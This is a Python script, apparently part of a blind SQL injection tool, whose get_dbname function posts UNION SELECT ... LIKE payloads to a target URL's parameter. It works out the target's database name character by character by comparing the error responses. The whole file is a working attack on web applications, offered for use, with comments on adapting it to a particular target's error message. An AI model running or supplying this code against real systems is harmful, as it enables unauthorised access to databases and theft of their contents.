from requests import *
import json
import time
from colorama import Fore,init;init()

def get_dbname(url,param):
    
    chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
    
    req_t = post(url, data={param : "thisisboulshetttt"})
    res_t = json.loads(req_t.text)

    for i in res_t:
        if (res_t[i] == "doesnt exist"):  # you should change here `doesnt exist` to your error
            indx_name = i

    if(indx_name == None or indx_name == ""):
        print(Fore.RED+"DBNAME=>cant get index name of return response pls change app/database.py line 13 `doesnt exist` error")
    else:
        pass
    
    char = 0
    dbname = ""
    print(Fore.LIGHTBLUE_EX + "current dbname : " + Fore.LIGHTGREEN_EX, end="")

    while(char != len(chars)):
        if(len(dbname) > 0):
            d = {param : f"0' UNION SELECT 1 WHERE database() LIKE '{dbname}{chars[char]}%'#"}
        else:
            d = {param : f"0' UNION SELECT 1 WHERE database() LIKE '{chars[char]}%'#"}
        
        # time.sleep(0.1)
        req = post(url, data=d)
        res = json.loads(req.text)
        if(res[i] == "doesnt exist"):
            char += 1
        else:
            dbname+=chars[char]
            print(chars[char],end="")
            char = 0
    return dbname